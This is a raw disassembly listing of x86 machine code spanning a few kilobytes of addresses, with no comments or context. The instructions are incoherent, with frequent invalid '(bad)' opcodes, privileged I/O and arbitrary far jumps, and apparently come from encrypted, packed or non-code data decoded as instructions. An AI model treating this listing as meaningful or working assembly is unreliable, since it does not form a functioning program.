  41b7d3:	retf   0x4bb0
  41b7d6:	retf   0x830
  41b7d9:	jmp    0x32170e6b
  41b7de:	mov    ebx,0xec639413
  41b7e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7e4:	xchg   edi,eax
  41b7e5:	(bad)  
  41b7e6:	hlt    
  41b7e7:	xchg   ah,dl
  41b7e9:	cmp    DWORD PTR [esi-0x2e],esi
  41b7ec:	ret    
  41b7ed:	maskmovq mm7,(bad)
  41b7ee:	idiv   DWORD PTR [esi-0x68]
  41b7f1:	fidivr WORD PTR [ecx-0x5c]
  41b7f4:	pop    ds
  41b7f5:	hlt    
  41b7f6:	data16 aam 0x53
  41b7f9:	cmp    al,0x4d
  41b7fb:	mov    BYTE PTR [esi-0x6a844a1a],dl
  41b801:	outs   dx,BYTE PTR ds:[esi]
  41b802:	mov    bh,0x3f
  41b804:	xchg   ecx,eax
  41b805:	cld    
  41b806:	(bad)  
  41b807:	cdq    
  41b808:	sbb    esp,DWORD PTR [esp+ebx*1]
  41b80b:	sub    edi,DWORD PTR ds:0x43cc1de1
  41b811:	sub    eax,0x4cf3cd2b
  41b816:	out    dx,eax
  41b817:	sbb    ecx,DWORD PTR [edi]
  41b819:	pop    ds
  41b81a:	fild   DWORD PTR [edi-0x30a5876e]
  41b820:	into   
  41b821:	inc    edx
  41b822:	lods   al,BYTE PTR ds:[esi]
  41b823:	push   edi
  41b824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b825:	cmp    BYTE PTR [edx+0xe2c1d6f],bh
  41b82b:	or     eax,0x93f16733
  41b830:	sbb    eax,0x55a6c556
  41b835:	xchg   BYTE PTR [esi],dl
  41b837:	add    esi,eax
  41b839:	mov    ds:0xa8664c1e,eax
  41b83e:	pusha  
  41b83f:	(bad)  
  41b840:	cmp    al,bl
  41b842:	sbb    cl,bh
  41b844:	mov    eax,ds:0xa5c9215a
  41b849:	fwait
  41b84a:	or     cl,bh
  41b84c:	clc    
  41b84d:	add    ecx,eax
  41b84f:	repnz inc edx
  41b851:	scas   eax,DWORD PTR es:[edi]
  41b852:	test   eax,0xa24f3197
  41b857:	mov    ebx,0x79fa3753
  41b85c:	scas   eax,DWORD PTR es:[edi]
  41b85d:	or     BYTE PTR [edx+0x1f],0xce
  41b861:	or     BYTE PTR [edi+ebx*1+0xafcc860],dh
  41b868:	sub    esp,DWORD PTR [ebp-0x56e9daaf]
  41b86e:	sti    
  41b86f:	lods   al,BYTE PTR ds:[esi]
  41b870:	in     al,dx
  41b871:	xchg   edi,eax
  41b872:	push   ebp
  41b873:	fsubp  st(0),st
  41b875:	jae    0x41b866
  41b877:	scas   al,BYTE PTR es:[edi]
  41b878:	(bad)  
  41b879:	pop    esp
  41b87a:	xor    eax,0x70066799
  41b87f:	sbb    BYTE PTR ds:0xd4a4d4b7,ch
  41b885:	jae    0x41b84e
  41b887:	mov    ch,0x17
  41b889:	pushf  
  41b88a:	jmp    0x81eea282
  41b88f:	mov    ebp,0xc5545ff0
  41b894:	add    BYTE PTR [ecx+eiz*1-0x54],al
  41b898:	fild   DWORD PTR [edi+0x30]
  41b89b:	push   0x43
  41b89d:	mov    ecx,DWORD PTR [edi-0x1ad1c13e]
  41b8a3:	mov    dh,0x40
  41b8a5:	adc    al,0xaf
  41b8a7:	out    0x57,al
  41b8a9:	imul   edx,edi,0xe4484bd7
  41b8af:	imul   ebp,DWORD PTR [eax],0xffffff99
  41b8b2:	xchg   esp,eax
  41b8b3:	push   ebx
  41b8b4:	jmp    0x418a:0x4c7df96f
  41b8bb:	sub    bh,BYTE PTR [esi+0x3e885d09]
  41b8c1:	inc    ebp
  41b8c2:	mov    edx,0x6876b13c
  41b8c7:	jae    0x41b90c
  41b8c9:	mov    ecx,0x8d13a87e
  41b8ce:	into   
  41b8cf:	mov    esp,0x6c0e3fd8
  41b8d4:	cs iret 
  41b8d6:	sbb    BYTE PTR [esi],bl
  41b8d8:	sub    ah,BYTE PTR [edi-0x61]
  41b8db:	ss push ds
  41b8dd:	jne    0x41b92c
  41b8df:	sub    eax,ebx
  41b8e1:	aaa    
  41b8e2:	xchg   edi,eax
  41b8e3:	inc    ebx
  41b8e4:	fdiv   QWORD PTR [esi+0x4c74edcd]
  41b8ea:	leave  
  41b8eb:	int    0xb0
  41b8ed:	jno    0x41b964
  41b8ef:	and    eax,0xdc68c37f
  41b8f4:	leave  
  41b8f5:	std    
  41b8f6:	clc    
  41b8f7:	xchg   esp,eax
  41b8f8:	aam    0xa7
  41b8fa:	test   eax,0xc8f83aab
  41b8ff:	xchg   ebp,eax
  41b900:	and    al,0x44
  41b902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b903:	icebp  
  41b904:	jl     0x41b8b7
  41b906:	adc    DWORD PTR [edx+0x41],eax
  41b909:	lods   al,BYTE PTR ds:[esi]
  41b90a:	in     al,0xef
  41b90c:	push   0x8cc95762
  41b911:	sbb    al,0xb6
  41b913:	adc    BYTE PTR [ebp+ecx*1-0x74fd50f1],al
  41b91a:	push   ebp
  41b91b:	cld    
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx+0x7bf22136]
  41b92f:	mov    WORD PTR [ebx],fs
  41b931:	lock out 0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b8c9
  41b93a:	xchg   ecx,eax
  41b93b:	int    0xd7
  41b93d:	jo     0x41b925
  41b93f:	stos   DWORD PTR es:[edi],eax
  41b940:	adc    DWORD PTR [edx+0x2b],ebx
  41b943:	mul    DWORD PTR [edi+0x4a970f50]
  41b949:	js     0x41b921
  41b94b:	inc    edi
  41b94c:	jmp    0xb49:0xb90dbf20
  41b953:	outs   dx,BYTE PTR ds:[esi]
  41b954:	cmp    al,0x97
  41b956:	mov    al,0xbf
  41b958:	(bad)  
  41b959:	jecxz  0x41b958
  41b95b:	shl    BYTE PTR [ecx*1+0x6a4913],cl
  41b962:	lock inc ecx
  41b964:	jbe    0x41b9d4
  41b966:	push   ebp
  41b967:	mov    eax,DWORD PTR [ecx]
  41b969:	adc    ebp,ebp
  41b96b:	jb     0x41b9e5
  41b96d:	adc    esp,eax
  41b96f:	leave  
  41b970:	pop    ebp
  41b971:	xchg   edx,eax
  41b972:	mov    dh,0x70
  41b974:	xor    DWORD PTR [ebp-0xc],edi
  41b977:	inc    edx
  41b978:	xor    eax,eax
  41b97a:	pop    ebp
  41b97b:	push   ebp
  41b97c:	stc    
  41b97d:	mov    ah,0xed
  41b97f:	inc    ecx
  41b980:	adc    BYTE PTR [esi],ch
  41b982:	(bad)  
  41b984:	mov    esp,0xa47efa4d
  41b989:	add    ebp,esi
  41b98b:	pop    edx
  41b98c:	leave  
  41b98d:	lock out dx,al
  41b98f:	or     cl,bh
  41b991:	stos   DWORD PTR es:[edi],eax
  41b992:	mov    al,0x1f
  41b994:	ins    DWORD PTR es:[edi],dx
  41b995:	sub    dl,BYTE PTR [ebx-0x349cd687]
  41b99b:	test   edi,esp
  41b99d:	jno    0x41b921
  41b99f:	jecxz  0x41b942
  41b9a1:	or     ecx,0x1033bbe9
  41b9a7:	or     DWORD PTR ds:0x7ed4fe7a,edi
  41b9ad:	adc    ch,BYTE PTR [esi+0x79]
  41b9b0:	pop    ecx
  41b9b1:	not    BYTE PTR [ecx]
  41b9b3:	push   esp
  41b9b4:	imul   ecx,DWORD PTR [eax],0x33ff4485
  41b9ba:	add    eax,0xc97ae765
  41b9bf:	add    BYTE PTR [ebx-0x6a7de60],dh
  41b9c5:	cmp    dl,dl
  41b9c7:	ds (bad) 
  41b9c9:	xor    al,0xd5
  41b9cb:	inc    edi
  41b9cc:	neg    BYTE PTR [ecx+0x69]
  41b9cf:	int3   
  41b9d0:	xchg   BYTE PTR fs:[esi-0x13c63e8b],dl
  41b9d7:	dec    edx
  41b9d8:	fdiv   DWORD PTR [edx*4+0x11af316b]
  41b9df:	sub    esp,eax
  41b9e1:	in     eax,0x81
  41b9e3:	push   esi
  41b9e4:	xchg   ebx,eax
  41b9e5:	fsubr  QWORD PTR [edi+0x64]
  41b9e8:	mov    eax,ds:0x798db423
  41b9ed:	xor    ebx,DWORD PTR [eax+0x28]
  41b9f0:	xor    eax,0xe41c9288
  41b9f5:	mov    ebx,0x88e9bb28
  41b9fa:	inc    DWORD PTR [edi]
  41b9fc:	jns    0x41b97f
  41b9fe:	jp     0x41ba46
  41ba00:	hlt    
  41ba01:	shl    BYTE PTR [edx-0x51e14752],cl
  41ba07:	stos   DWORD PTR es:[edi],eax
  41ba08:	mov    ebp,0xbf9114dc
  41ba0d:	jp     0x41b9a1
  41ba0f:	or     DWORD PTR [ebx-0x52],edx
  41ba12:	mov    ds:0x2445ca52,al
  41ba17:	dec    esi
  41ba18:	sub    ah,BYTE PTR [ecx+0x1]
  41ba1b:	stc    
  41ba1c:	jae    0x41ba22
  41ba1e:	out    0x2d,al
  41ba20:	or     WORD PTR [ebp+0x6d1b8634],di
  41ba27:	(bad)  
  41ba29:	mov    edx,0x6c2c3d47
  41ba2e:	lds    edx,FWORD PTR [ecx-0x29db93e1]
  41ba34:	and    DWORD PTR [eax-0xd684fcd],ecx
  41ba3a:	pop    ds
  41ba3b:	adc    al,0x36
  41ba3d:	push   eax
  41ba3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba3f:	cmp    edx,DWORD PTR [eax+0x79581710]
  41ba45:	js     0x41b9cf
  41ba47:	sub    ebx,DWORD PTR [eax]
  41ba49:	stos   BYTE PTR es:[edi],al
  41ba4a:	in     al,0xf2
  41ba4c:	aad    0x45
  41ba4e:	lods   al,BYTE PTR ds:[esi]
  41ba4f:	mov    ecx,0x73ee1bc9
  41ba54:	inc    esi
  41ba55:	fsub   QWORD PTR [ecx]
  41ba57:	loope  0x41b9eb
  41ba59:	push   0xffffff80
  41ba5b:	scas   al,BYTE PTR es:[edi]
  41ba5c:	pop    ecx
  41ba5d:	cs push 0xffffffd8
  41ba60:	cmp    al,0xb3
  41ba62:	fsub   DWORD PTR [ecx]
  41ba64:	sub    ecx,0x5e9a8eb7
  41ba6a:	jne    0x41baa6
  41ba6c:	test   al,0x5c
  41ba6e:	and    al,0xc9
  41ba70:	fnsave [esi-0x3e025af]
  41ba76:	lods   al,BYTE PTR ds:[esi]
  41ba77:	sub    eax,DWORD PTR [ebx]
  41ba79:	xlat   BYTE PTR ds:[bx]
  41ba7b:	dec    ecx
  41ba7c:	fcomp  DWORD PTR [eax]
  41ba7e:	and    ebx,DWORD PTR [ecx]
  41ba80:	(bad)  
  41ba82:	pop    esi
  41ba83:	imul   esi,DWORD PTR [edi+0x5c],0x53
  41ba87:	jno    0x41ba62
  41ba89:	int    0x97
  41ba8b:	sbb    BYTE PTR [ecx],ch
  41ba8d:	mov    bh,0x77
  41ba8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba90:	int    0xa2
  41ba92:	xchg   edi,eax
  41ba93:	lds    edx,FWORD PTR [eax+edx*4-0x4ae17cc1]
  41ba9a:	call   0x6c84:0xc484f82b
  41baa1:	mov    WORD PTR [esi+0x7e],gs
  41baa4:	mov    ds:0xd8b0ebe3,al
  41baa9:	ror    BYTE PTR [esi-0x3a],1
  41baac:	scas   al,BYTE PTR es:[edi]
  41baad:	(bad)
  41bab0:	cmp    dh,0xaf
  41bab3:	test   eax,0x2e847102
  41bab8:	cld    
  41bab9:	into   
  41baba:	mov    ecx,0x8121d6c3
  41babf:	xchg   edx,eax
  41bac0:	jge    0x41bae3
  41bac2:	push   ds
  41bac3:	mov    ebp,0x67b91568
  41bac8:	repnz pushf 
  41baca:	pop    ecx
  41bacb:	fwait
  41bacc:	mov    ebx,0x3226e0e4
  41bad1:	daa    
  41bad2:	and    BYTE PTR [esi],bh
  41bad4:	hlt    
  41bad5:	scas   al,BYTE PTR es:[edi]
  41bad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bad7:	in     al,0x23
  41bad9:	loopne 0x41ba73
  41badb:	es pop edx
  41badd:	mov    ah,0xa3
  41badf:	aad    0xd5
  41bae1:	push   ecx
  41bae2:	dec    edx
  41bae3:	cld    
  41bae4:	xor    BYTE PTR ds:0x62496f45,dl
  41baea:	sbb    al,0x83
  41baec:	(bad)  
  41baee:	jle    0x41bb11
  41baf0:	or     ch,bl
  41baf2:	stos   BYTE PTR es:[edi],al
  41baf3:	dec    eax
  41baf4:	and    eax,0xeb0c2d7f
  41baf9:	loop   0x41bb4e
  41bafb:	ins    BYTE PTR es:[edi],dx
  41bafc:	mov    edx,0xce72a535
  41bb01:	sbb    DWORD PTR ds:0xd0329367,esp
  41bb07:	dec    esi
  41bb08:	adc    bh,BYTE PTR [edx]
  41bb0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb0b:	lods   al,BYTE PTR ds:[esi]
  41bb0c:	ret    
  41bb0d:	xor    ebx,DWORD PTR [edi+ebx*8+0x7f]
  41bb11:	adc    dh,BYTE PTR [esi]
  41bb13:	sub    bl,BYTE PTR [edx+0x29]
  41bb16:	inc    si
  41bb18:	add    eax,0x67ab433c
  41bb1d:	dec    edi
  41bb1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb1f:	fcom   DWORD PTR [ebx+0x709273c2]
  41bb25:	mov    esp,0x5f29ed7b
  41bb2a:	js     0x41bb30
  41bb2c:	inc    ebp
  41bb2d:	sbb    esi,DWORD PTR [edi]
  41bb2f:	adc    DWORD PTR [ecx-0x64b93811],ebx
  41bb35:	cmp    DWORD PTR [edi-0x19fdb5ef],0x1d
  41bb3c:	fist   DWORD PTR [edi-0x79]
  41bb3f:	adc    dl,BYTE PTR [ebp-0x63d655b4]
  41bb45:	fist   WORD PTR [ebp+0x3ae728e6]
  41bb4b:	adc    al,0xe7
  41bb4d:	push   edi
  41bb4e:	nop
  41bb4f:	inc    esp
  41bb50:	mov    dl,0x33
  41bb52:	shr    ecx,1
  41bb54:	xor    BYTE PTR [edx],al
  41bb56:	add    BYTE PTR [eax],al
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0x5f17bf12
  41bb65:	xchg   ebx,eax
  41bb66:	jno    0x41bba4
  41bb68:	mov    ah,ah
  41bb6a:	jg     0x41bbe4
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41bbc6
  41bb71:	mov    edi,0x7957fc73
  41bb76:	mov    ah,0x85
  41bb78:	inc    eax
  41bb79:	jnp    0x41bb1c
  41bb7b:	inc    esp
  41bb7c:	mov    WORD PTR [eax-0x1e95a31f],?
  41bb82:	push   ebx
  41bb83:	imul   esi,DWORD PTR [bp+si],0x2e59edf5
  41bb8a:	and    dh,0xc
  41bb8d:	or     esi,DWORD PTR [ebx]
  41bb8f:	pop    es
  41bb90:	mov    WORD PTR [esi],ds
  41bb92:	dec    ecx
  41bb93:	out    0xec,eax
  41bb95:	add    eax,0x399cd61b
  41bb9a:	pop    es
  41bb9b:	jnp    0x41bbd4
  41bb9d:	jbe    0x41bb69
  41bb9f:	call   0xd59b4892
  41bba4:	mov    ds:0x25fbb294,al
  41bba9:	adc    ecx,ecx
  41bbab:	push   fs
  41bbad:	pop    ds
  41bbae:	fadd   DWORD PTR [ecx]
  41bbb0:	xlat   BYTE PTR ds:[ebx]
  41bbb1:	pop    eax
  41bbb2:	les    esi,FWORD PTR [edx+0x4a]
  41bbb5:	jb     0x41bc05
  41bbb7:	mov    esi,0x697b1b0e
  41bbbc:	lahf   
  41bbbd:	xchg   DWORD PTR [ebx],edi
  41bbbf:	sub    eax,0x7375343
  41bbc4:	cmc    
  41bbc5:	out    dx,al
  41bbc6:	(bad)  
  41bbc8:	std    
  41bbc9:	add    eax,0xc2ae88eb
  41bbce:	pop    esp
  41bbcf:	sub    esi,eax
  41bbd1:	add    bl,al
  41bbd3:	add    dh,0x34
  41bbd6:	lock jne 0x41bb64
  41bbd9:	repz sub dl,BYTE PTR cs:[edx-0x23]
  41bbde:	pusha  
  41bbdf:	test   DWORD PTR [ecx-0x46],0x47e178db
  41bbe6:	mov    ds:0xcc04b7aa,al
  41bbeb:	dec    edx
  41bbec:	xchg   ebx,eax
  41bbed:	push   esi
  41bbee:	ret    0x5048
  41bbf1:	fnstsw WORD PTR [ebp+esi*4-0x1cae80d6]
  41bbf8:	jecxz  0x41bbd9
  41bbfa:	sub    eax,0xe3a1be40
  41bbff:	jo     0x41bc06
  41bc01:	jns    0x41bb86
  41bc03:	jo     0x41bb87
  41bc05:	(bad)  
  41bc06:	jge    0x41bb9e
  41bc08:	repnz push esp
  41bc0a:	nop
  41bc0b:	jb     0x41bc61
  41bc0d:	ret    0x872d
  41bc10:	pop    edx
  41bc11:	ret    0x3b10
  41bc14:	fidiv  WORD PTR [edx-0x1aee9135]
  41bc1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc1b:	retf   0xe86f
  41bc1e:	push   cs
  41bc1f:	jae    0x41bbf0
  41bc21:	and    bh,BYTE PTR gs:[ecx]
  41bc24:	jg     0x41bbb6
  41bc26:	or     DWORD PTR ds:0x3003392d,ebx
  41bc2c:	inc    ebx
  41bc2d:	dec    ecx
  41bc2e:	test   al,0x31
  41bc30:	lea    edx,[ebx-0x72]
  41bc33:	cmp    dh,dh
  41bc35:	mov    ebp,0x2ae47f
  41bc3a:	pop    ds
  41bc3b:	xor    ah,BYTE PTR [edx]
  41bc3d:	jbe    0x41bbd3
  41bc3f:	mov    dl,0x15
  41bc41:	lahf   
  41bc42:	ffreep st(4)
  41bc44:	dec    ebp
  41bc45:	in     al,0xe0
  41bc47:	int    0x6b
  41bc49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc4a:	push   ebx
  41bc4b:	bound  esp,QWORD PTR [ebp+0x7f]
  41bc4e:	jnp    0x41bc31
  41bc50:	aaa    
  41bc51:	rcr    BYTE PTR es:[ebp-0x7f],1
  41bc55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc56:	les    esp,FWORD PTR [ecx]
  41bc58:	or     BYTE PTR [edx+ebp*4],cl
  41bc5b:	or     DWORD PTR [eax-0x747a561f],ebx
  41bc61:	sbb    DWORD PTR [eax+0x45],esp
  41bc64:	mov    edx,0x802f7626
  41bc69:	sbb    al,0x3e
  41bc6b:	(bad)  
  41bc6c:	test   DWORD PTR [eax],0xd4410161
  41bc72:	mov    ah,0xb
  41bc74:	inc    eax
  41bc75:	jno    0x41bcc2
  41bc77:	mov    ebp,0xd7e16292
  41bc7c:	mov    eax,0x966f7783
  41bc81:	(bad)  
  41bc82:	clc    
  41bc83:	into   
  41bc84:	pop    ds
  41bc85:	stos   BYTE PTR es:[edi],al
  41bc86:	add    esi,DWORD PTR [ebx]
  41bc88:	outs   dx,BYTE PTR ds:[esi]
  41bc89:	das    
  41bc8a:	arpl   WORD PTR [ecx-0xe],bp
  41bc8d:	mov    bh,0x7b
  41bc8f:	mov    ebx,0x844de964
  41bc94:	sub    eax,0xa069f9a
  41bc99:	test   al,0x31
  41bc9b:	in     eax,dx
  41bc9c:	je     0x41bcc1
  41bc9e:	xor    dl,ah
  41bca0:	adc    eax,edi
  41bca2:	je     0x41bc86
  41bca4:	xor    bh,dl
  41bca6:	jmp    0xc1a9:0xc3b6d4e0
  41bcad:	loope  0x41bc60
  41bcaf:	add    esi,DWORD PTR ds:0x7af99d03
  41bcb5:	xchg   BYTE PTR [esi],al
  41bcb7:	ret    
  41bcb8:	out    dx,eax
  41bcb9:	lds    ebp,FWORD PTR [eax-0x7a9e68de]
  41bcbf:	pop    es
  41bcc0:	fldenv [ecx+0x32]
  41bcc3:	inc    esp
  41bcc4:	jne    0x41bd25
  41bcc6:	sub    al,0x18
  41bcc8:	xor    cl,BYTE PTR [ebp-0x56edd53e]
  41bcce:	mov    bl,0x5d
  41bcd0:	inc    BYTE PTR [ecx+0x2c]
  41bcd3:	mov    esi,0x797ab490
  41bcd8:	test   BYTE PTR [esp+eiz*8],dh
  41bcdb:	mov    eax,ds:0x3399218f
  41bce0:	and    BYTE PTR [edi],al
  41bce2:	daa    
  41bce3:	ja     0x41bc70
  41bce5:	cld    
  41bce6:	jne    0x41bd2c
  41bce8:	or     BYTE PTR [eax+0x4a],cl
  41bceb:	and    eax,0xe6555ed3
  41bcf0:	and    eax,0xff1e6bb0
  41bcf5:	in     eax,0xec
  41bcf7:	nop
  41bcf8:	iret   
  41bcf9:	sub    bh,BYTE PTR [esp+edx*1-0x7d3bd832]
  41bd00:	cwde   
  41bd01:	in     al,dx
  41bd02:	lods   eax,DWORD PTR ds:[esi]
  41bd03:	fwait
  41bd04:	stos   DWORD PTR es:[edi],eax
  41bd05:	inc    edx
  41bd06:	xor    BYTE PTR [esi-0x6a],dl
  41bd09:	mov    eax,0x13239944
  41bd0e:	push   0xe4526e6e
  41bd13:	mov    al,0xcc
  41bd15:	mov    ds:0x77d71f53,al
  41bd1a:	and    BYTE PTR [ebx+0x889d410],ch
  41bd20:	cli    
  41bd21:	mov    esi,ss
  41bd23:	jecxz  0x41bd2b
  41bd25:	arpl   WORD PTR [edx],sp
  41bd27:	and    eax,0x91d99805
  41bd2c:	pop    edi
  41bd2d:	std    
  41bd2e:	pop    ebp
  41bd2f:	add    DWORD PTR ds:0x3e2e463a,edi
  41bd35:	dec    edi
  41bd36:	pop    ecx
  41bd37:	cmp    eax,0xd3a61f77
  41bd3c:	xor    BYTE PTR [eax],bl
  41bd3e:	dec    ebx
  41bd3f:	sbb    al,0x9c
  41bd41:	mov    ebp,0xc26af818
  41bd46:	jmp    0x41bd6b
  41bd48:	mov    bh,0x8
  41bd4a:	push   edi
  41bd4b:	fnstenv [esi]
  41bd4d:	xor    al,0x18
  41bd4f:	add    eax,DWORD PTR [ecx+0x75a39334]
  41bd55:	mov    esi,0x6f11dadd
  41bd5a:	sub    al,al
  41bd5c:	push   0xffffffed
  41bd5e:	repnz int3 
  41bd60:	adc    DWORD PTR [ebp-0x1ef8a673],eax
  41bd66:	aas    
  41bd67:	nop
  41bd68:	sbb    DWORD PTR [esi+0x43],ebx
  41bd6b:	mov    cl,0xb0
  41bd6d:	jmp    0xffd6:0xf7a43cb5
  41bd74:	xlat   BYTE PTR ds:[ebx]
  41bd75:	cmp    ah,ch
  41bd77:	jg     0x41bd9e
  41bd79:	mov    ecx,0x77d886e5
  41bd7e:	push   esp
  41bd7f:	addr16 aas 
  41bd81:	idiv   DWORD PTR [esi+0x6dd77597]
  41bd87:	ror    DWORD PTR [ebx+0x30e9084d],1
  41bd8d:	add    al,BYTE PTR [eax]
  41bd8f:	add    dh,cl
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0x33
  41bd9d:	aas    
  41bd9e:	test   DWORD PTR [ecx],ecx
  41bda0:	mov    al,ds:0x10787fea
  41bda5:	jle    0x41be1f
  41bda7:	js     0x41bd73
  41bda9:	and    eax,0x99ec6951
  41bdae:	mov    ebp,0x4eea28d5
  41bdb3:	(bad)  
  41bdb4:	retf   0x4e5d
  41bdb7:	cmp    edx,DWORD PTR [ecx+0x5cb8b74b]
  41bdbd:	mov    ch,0x9c
  41bdbf:	sbb    BYTE PTR [edx+0x6cab529e],dl
  41bdc5:	xor    al,0x58
  41bdc7:	push   ecx
  41bdc8:	or     dh,cl
  41bdca:	shl    edi,0xda
  41bdcd:	jo     0x41be28
  41bdcf:	mov    BYTE PTR [ebx-0x5062bf05],bl
  41bdd5:	dec    ecx
  41bdd6:	and    cl,BYTE PTR [ebx]
  41bdd8:	test   eax,0xf77eff3e
  41bddd:	nop
  41bdde:	inc    ebp
  41bddf:	push   ecx
  41bde0:	pop    ebp
  41bde1:	mov    ch,0xd6
  41bde3:	mov    eax,DWORD PTR [edx]
  41bde5:	popa   
  41bde6:	inc    esi
  41bde7:	inc    eax
  41bde8:	in     eax,0x78
  41bdea:	jne    0x41be38
  41bdec:	out    dx,al
  41bded:	stos   DWORD PTR es:[edi],eax
  41bdee:	ret    0xfb73
  41bdf1:	xchg   esp,eax
  41bdf2:	push   cs
  41bdf3:	adc    esi,esp
  41bdf5:	sbb    DWORD PTR [esi],0xe1dbb78e
  41bdfb:	outs   dx,BYTE PTR ds:[esi]
  41bdfc:	xor    DWORD PTR ds:0xc951673f,edx
  41be02:	repnz outs dx,BYTE PTR ds:[esi]
  41be04:	and    esi,ebx
  41be06:	cmp    eax,0xe2c57af9
  41be0b:	lds    eax,FWORD PTR [esi-0x18]
  41be0e:	gs jmp 0x41be6a
  41be11:	add    BYTE PTR [ecx+ecx*1],bl
  41be14:	addr16 popf 
  41be16:	sbb    dl,BYTE PTR [ebp+0x1e907ebd]
  41be1c:	push   es
  41be1d:	in     eax,0x21
  41be1f:	push   cs
  41be20:	xchg   edi,eax
  41be21:	inc    edx
  41be22:	(bad)  
  41be23:	daa    
  41be24:	jmp    0xd54a:0xe992ea10
  41be2b:	fcomp  DWORD PTR [ebx+0x384ca465]
  41be31:	or     al,0x91
  41be33:	and    eax,0x7be583f7
  41be38:	cmp    bh,bh
  41be3a:	std    
  41be3b:	push   ds
  41be3c:	cmp    ecx,DWORD PTR [eax]
  41be3e:	loop   0x41be9e
  41be40:	cwde   
  41be41:	arpl   WORD PTR [ecx-0x2e],di
  41be44:	iret   
  41be45:	outs   dx,BYTE PTR ds:[esi]
  41be46:	loop   0x41bec3
  41be48:	ja     0x41be41
  41be4a:	loopne 0x41be34
  41be4c:	aam    0xf1
  41be4e:	ins    DWORD PTR es:[edi],dx
  41be4f:	mov    DWORD PTR [ebp-0x32bc825d],eax
  41be55:	adc    bl,BYTE PTR [esi-0x3af2673c]
  41be5b:	inc    ebp
  41be5c:	add    eax,0x5423bc3a
  41be61:	push   ss
  41be62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be63:	pop    es
  41be64:	shl    ebp,1
  41be66:	xor    BYTE PTR [eax],dh
  41be68:	add    al,0x84
  41be6a:	xor    eax,0x3f2831df
  41be6f:	lods   al,BYTE PTR ds:[esi]
  41be70:	in     al,0x81
  41be72:	xor    DWORD PTR [edx-0x3c],esi
  41be75:	inc    eax
  41be76:	mov    esi,ebp
  41be78:	pop    edx
  41be79:	dec    ebx
  41be7a:	sub    al,0x9a
  41be7c:	nop
  41be7d:	push   0xdf711e68
  41be82:	xchg   edx,eax
  41be83:	out    0x34,al
  41be85:	stos   BYTE PTR es:[edi],al
  41be86:	dec    edx
  41be87:	sbb    BYTE PTR [esi-0x15],bh
  41be8a:	mov    edx,0xfeff6163
  41be8f:	fs adc al,0x59
  41be92:	adc    ch,al
  41be94:	scas   eax,DWORD PTR es:[edi]
  41be95:	call   0x8b541cb2
  41be9a:	or     edx,0x8d7e43bb
  41bea0:	xchg   esi,eax
  41bea1:	mov    bh,0x9
  41bea3:	sub    eax,0x6b2736fd
  41bea8:	add    ebp,DWORD PTR ds:0x50825490
  41beae:	xchg   BYTE PTR [edx-0x2d9a8083],bh
  41beb4:	jbe    0x41bf20
  41beb6:	mov    ebx,DWORD PTR [esi+esi*2]
  41beb9:	add    DWORD PTR [edi+0x9af56e3],eax
  41bebf:	(bad)
  41bec3:	in     eax,dx
  41bec4:	mov    ds,esp
  41bec6:	out    0x18,eax
  41bec8:	cmp    DWORD PTR [edi-0x4935fcee],esp
  41bece:	mov    esp,0x24db9c6e
  41bed3:	add    DWORD PTR [edi],0x724954b8
  41bed9:	scas   eax,DWORD PTR es:[edi]
  41beda:	iret   
  41bedb:	push   ebx
  41bedc:	push   ss
  41bedd:	jle    0x41bf28
  41bedf:	fld    QWORD PTR [ebp-0x32]
  41bee2:	cdq    
  41bee3:	xchg   esi,eax
  41bee4:	jnp    0x41bf46
  41bee6:	lods   eax,DWORD PTR ds:[esi]
  41bee7:	js     0x41be97
  41bee9:	mov    eax,DWORD PTR [edi-0x27fb2998]
  41beef:	add    al,0xe2
  41bef1:	pop    edx
  41bef2:	ret    0xad1c
  41bef5:	fsubrp st(5),st
  41bef7:	mov    ?,WORD PTR [edi+edi*4+0x4dfb9043]
  41befe:	mov    eax,0x8cdc5736
  41bf03:	cmp    bh,BYTE PTR [ebp+0x75]
  41bf06:	fs fcom st(5)
  41bf09:	pop    es
  41bf0a:	or     eax,0x5d20aadf
  41bf0f:	rcl    BYTE PTR [ecx],1
  41bf11:	lock push esi
  41bf13:	(bad)  
  41bf14:	call   FWORD PTR [eax-0x712973af]
  41bf1a:	int3   
  41bf1b:	xor    DWORD PTR [esi-0x688faba9],edx
  41bf21:	es mov ah,0x8a
  41bf24:	xchg   DWORD PTR [ecx],edx
  41bf26:	xchg   edx,eax
  41bf27:	ret    
  41bf28:	dec    eax
  41bf29:	js     0x41bf88
  41bf2b:	pop    es
  41bf2c:	cdq    
  41bf2d:	mov    ds:0x8bfa4eeb,eax
  41bf32:	fsub   QWORD PTR [esi+0x2e]
  41bf35:	push   0x13baed34
  41bf3a:	mov    esi,0xd0c18092
  41bf3f:	mov    ds:0x454b9200,eax
  41bf44:	push   esi
  41bf45:	sub    ecx,DWORD PTR [edx+0x32c543]
  41bf4b:	(bad)  
  41bf4c:	mov    edi,DWORD PTR [edx+0x1912bafb]
  41bf52:	xchg   BYTE PTR [ebx+edx*4],ch
  41bf55:	add    esi,DWORD PTR [ebx+0x59e19e3f]
